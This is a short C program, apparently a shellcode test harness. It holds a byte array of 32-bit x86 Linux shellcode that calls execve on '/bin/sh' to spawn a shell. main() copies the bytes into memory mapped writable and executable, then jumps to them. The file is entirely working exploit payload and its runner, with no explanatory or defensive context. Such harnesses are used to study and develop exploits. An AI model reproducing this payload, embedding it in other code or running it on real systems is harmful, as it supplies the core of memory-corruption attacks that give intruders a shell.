#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = {
"\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x4b\x4b\x4b\x4b"

};

int main() {
    void *ptr = mmap(0, sizeof(shellcode), PROT_EXEC | PROT_WRITE | PROT_READ,
                     MAP_ANON | MAP_PRIVATE, -1, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    memcpy(ptr, shellcode, sizeof(shellcode));
    ((void(*)())ptr)();

    return 0;
}
